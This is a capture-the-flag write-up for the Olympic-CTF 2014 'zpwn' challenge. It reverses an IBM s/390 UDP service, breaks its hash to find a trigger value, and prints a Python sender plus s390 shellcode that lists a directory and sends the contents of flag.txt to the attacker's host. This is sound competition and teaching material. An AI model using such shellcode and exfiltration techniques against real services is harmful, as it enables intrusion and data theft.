@@ -1,0 +1,259 @@
+Olympic-CTF 2014: zpwn (200 points)
+===================================
+
+This challenge was based on an IBM s/390 ELF running on a remote server
+which listens on UDP port 31337.
+
+The first thing we did was to setup *Hercules*, an open source software
+implementation of the mainframe System/370 and ESA/390 architectures, to
+run a linux distribution. After some tries with Debian and openSUSE, we finally
+succeeded to set up Fedora 20 on this emulator.
+
+## Reversing ELF
+
+At first sight, the binary seems to send the entire buffer sent by the client
+via UDP.
+
+After disassembling it, we saw that the buffer is hashed and compared to a
+constant value: if the hash is equal to `0xfffcecc8` then the process jumps into
+the received buffer instead of sending it back.
+
+    :::asm
+    /* Receive buffer via UDP */
+    80000b26:   a7 49 20 00             lghi    %r4,8192 ; len
+    80000b2a:   b9 04 00 2a             lgr     %r2,%r10 ; sockfd
+    80000b2e:   b9 04 00 3b             lgr     %r3,%r11 ; buff
+    80000b32:   a7 59 00 00             lghi    %r5,0    ; flags
+    80000b36:   b9 04 00 69             lgr     %r6,%r9  ; src_addr
+    80000b3a:   a7 18 00 10             lhi     %r1,16
+    80000b3e:   50 10 f0 cc             st      %r1,204(%r15)
+    80000b42:   c0 e5 ff ff fe 51       brasl   %r14,800007e4 <recvfrom@plt>
+    80000b48:   b9 14 00 42             lgfr    %r4,%r2
+    80000b4c:   b9 02 00 44             ltgr    %r4,%r4
+    80000b50:   a7 84 00 1d             je      80000b8a
+    80000b54:   b9 04 00 5b             lgr     %r5,%r11
+    80000b58:   a7 28 ff ff             lhi     %r2,-1
+    80000b5c:   b9 04 00 34             lgr     %r3,%r4
+
+    /* Hash buffer */
+    80000b60:   43 10 50 00             ic      %r1,0(%r5)
+    80000b64:   41 50 50 01             la      %r5,1(%r5)
+    80000b68:   17 12                   xr      %r1,%r2
+    80000b6a:   88 20 00 08             srl     %r2,8
+    80000b6e:   b9 84 00 11             llgcr   %r1,%r1
+    80000b72:   eb 11 00 02 00 0d       sllg    %r1,%r1,2
+    80000b78:   57 21 c0 00             x       %r2,0(%r1,%r12)
+    80000b7c:   a7 37 ff f2             brctg   %r3,80000b60
+    80000b80:   c2 2d ff fc ec c8       cfi     %r2,-201528 ; Compare hash to 0xfffcecc8
+    80000b86:   a7 84 00 14             je      80000bae
+
+    /* Send buffer via UDP if hash(buffer) != 0x31eedfb4 */
+    80000b8a:   b9 04 00 2a             lgr     %r2,%r10 ; sockfd
+    80000b8e:   b9 04 00 3b             lgr     %r3,%r11 ; buff
+    80000b92:   a7 59 00 00             lghi    %r5,0    ; flags
+    80000b96:   b9 04 00 69             lgr     %r6,%r9  ; dest_addr
+    80000b9a:   a7 19 00 10             lghi    %r1,16
+    80000b9e:   e3 10 f0 a0 00 24       stg     %r1,160(%r15)
+    80000ba4:   c0 e5 ff ff fe 70       brasl   %r14,80000884 <sendto@plt>
+    80000baa:   a7 f4 ff bb             j       80000b20
+
+    /* Jump into buffer if hash(buffer) == 0xfffcecc8 */
+    80000bae:   0d eb                   basr    %r14,%r11
+    80000bb0:   a7 f4 ff b8             j       80000b20
+
+## Breaking the hash
+
+When we look closer to the hash function, we can see that `%r2` register is
+initialized to `0xffffffff` and then xored with some values located in
+`.rodata`. Because `%r2` is right shifted before each `xor` operation, it is
+easy to find the location of this data by applying a reversed version of this
+algorithm and analysing the most significant byte of each `%r2` value.
+
+    :::text
+    800010e0:   ff 0f 6a 70
+              ^ ff fc ec c8
+              --------------
+                00 f3 86 b8 ----\
+                                |
+                                | srl 8
+    80000dc4:   f3 b9 71 48     |
+              ^ f3 86 b8 xx   <-/
+              --------------
+                00 3f c9 xx ----\
+                                |
+                                | srl 8
+    80001014:   3f b5 06 dd     |
+              ^ 3f c9 xx xx   <-/
+              --------------
+                00 7c xx xx
+
+    800010b4:   7c dc ef b7
+
+Then, we deduced that these values are located at `800010b4`, `80001014`,
+`80000dc4` and `800010b4`. We could now apply the right algorithm to get
+the real values of `%r2`.
+
+    :::text
+    (0xffffffff >> 8) ^ 0x7cdcefb7 = 0x7c231048
+    (0x7c231048 >> 8) ^ 0x3fb506dd = 0x3fc925cd
+    (0x3fc925cd >> 8) ^ 0xf3b97148 = 0xf386b86d
+    (0xf386b86d >> 8) ^ 0xff0f6a70 = 0xfffcecc8
+
+The less significant byte of this values must now be xored with each offset
+to obtain the key.
+
+    :::text
+    Offsets:
+       (0x800010e0 - 0x80000d7c) >> 2 = 0xd9
+       (0x80000dc4 - 0x80000d7c) >> 2 = 0x12
+       (0x80001014 - 0x80000d7c) >> 2 = 0xa6
+       (0x800010b4 - 0x80000d7c) >> 2 = 0xce
+
+    Key: 0xcea612d9 ^ 0xff48cd6d = 0x31eedfb4
+
+So, when this process receives `0x31eedfb4` via UDP, it jumps to the buffer
+address.
+
+To prevent SIGSEGV or SIGILL when the process executes the first
+instruction of shellcode, we first need to complete the opcode `0xdfb4` to
+get a valid instruction:
+
+    :::asm
+    31 ee               lner %f14,%f14
+    df b4 0f 00 00 00   edmk 0(181,%r15),0
+
+## Exploit
+
+Here is the python script that we used to generate shellcodes using
+`s390-linux-as` and `s390-linux-objcopy` and send it to the remote
+machine:
+
+    :::python
+    import socket
+    import subprocess
+
+    SERVER_IP = "109.233.61.11"
+    CLIENT_IP = # local ip
+
+    UDP_PORT = 31337
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.sendto("Hi !", (SERVER_IP, UDP_PORT))
+    print sock.recvfrom(1024)[0]
+    port = sock.getsockname()[1]
+
+    asm = open("exploit200.s").read()
+    asm = asm.replace("____", hex(port)[2:])
+    asm = asm.replace("-------", CLIENT_IP)
+
+    p = subprocess.Popen("s390-linux-as -o exploit200",
+                          stdin=subprocess.PIPE, shell=True)
+
+    p.communicate(asm)
+
+    p = subprocess.Popen("s390-linux-objcopy -O binary exploit200 /dev/stdout",
+                       stdout=subprocess.PIPE, shell=True)
+
+    sock.sendto(p.communicate()[0], (SERVER_IP, UDP_PORT))
+    print sock.recvfrom(1024)[0]
+    sock.sendto("\x31\xee\xdf\xb4", (SERVER_IP, UDP_PORT))
+    print sock.recvfrom(1024)[0]
+
+### Listing the current directory
+
+The first step of this exploit is to list the current directory to find
+the file which contains the flag. This can be done by filling a buffer with
+`getdents` syscall and then send it via UDP to the local machine.
+
+    :::asm
+        .long 0x00000000
+        .long 0xf0000000
+    exploit:
+         /* open */
+        lhi     %r1, 5
+        larl    %r2, dir
+        lhi     %r3, 0
+        lhi     %r4, 0
+        svc     0
+
+        /*getdents*/
+        lhi     %r1, 141
+        lgr     %r3,%r11
+        afi     %r3, 4096
+        lghi    %r4, 4096
+        svc     0
+
+        /* sendto */
+        lgr     %r4,%r2
+        lgr     %r2,%r10
+        lgr     %r3,%r11
+        afi     %r3, 4096
+        lghi    %r5,0
+        larl    %r6, addr
+        afi     %r12, -1272
+        lghi    %r1,16
+        stg     %r1,160(%r15)
+        balr    %r14, %r12
+    addr:   .quad 0x02____-------
+    dir:    .string "."
+
+Response:
+
+    :::text
+    \x00\x00\x00\x00\x00\x00\x00\x11\x0fe\x95\xe2\xb6>!I\x00 nohup.out\x00\x00
+    \x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x12\x1c\t^\r\x82\x91T\xe0\x00\x18
+    zpwn\x00\x08\x00\x00\x00\x00\x00\x00\x00\x0c2z)5\x13T\xc6\x17\x00\x18.\x00
+    \x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x13?F\xf4bC\\\xcf\xda\x00(
+    .bash_history\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00
+    \x00\rB\xf6H\x1f\x00 \xb1\xb4\x00 .bash_logout\x00\x08\x00\x00\x00\x00\x00
+    \x00\x00\x0fN_\x88r\x1b\xbc\x90L\x00 .bashrc\x00\x00\x00\x00\x00\x00\x08
+    \x00\x00\x00\x00\x00\x00\x00\x02OpO/F\x88\x8f\x00\x00\x18..\x00\x00\x00
+    \x04\x00\x00\x00\x00\x00\x00\x00\x0eY{P\xb5\xc3\xe0\x02\xf0\x00 .profile
+    \x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x16m\x9cn\xc56.\x9a\x91
+    \x00 watchdog.sh\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x10\x7f\xff\xff\xff
+    \xff\xff\xff\xff\x00 flag.txt\x00\x00\x00\x00\x00\x08
+
+Thanks to `getdents`'s buffer, we can then see that a file `flag.txt` exists in
+the current directory.
+
+### Reading flag.txt
+
+Let's try to open `flag.txt` and read its contents:
+
+    :::asm
+        .long 0x00000000
+        .long 0xf0000000
+    exploit:
+        /* open */
+        lhi     %r1, 5
+        larl    %r2, flag
+        lhi     %r3, 0
+        lhi     %r4, 0
+        svc     0
+
+        /*read*/
+        lhi     %r1, 3
+        lgr     %r3,%r11
+        afi     %r3, 4096
+        lhi     %r4, 4096
+        svc     0
+
+        /* sendto */
+        lgr     %r4,%r2
+        lgr     %r2,%r10
+        lgr     %r3,%r11
+        afi     %r3, 4096
+        lghi    %r5,0
+        larl    %r6, addr
+        afi     %r12, -1272
+        lghi    %r1,16
+        stg     %r1,160(%r15)
+        balr    %r14, %r12
+
+    addr:   .quad 0x02____-------
+    flag:   .string "./flag.txt"
+
+And it worked, giving us the flag: `CTF{684eed23a11fd416bb56b809d491eef4}`
+
+-- 
+Pierre Surply
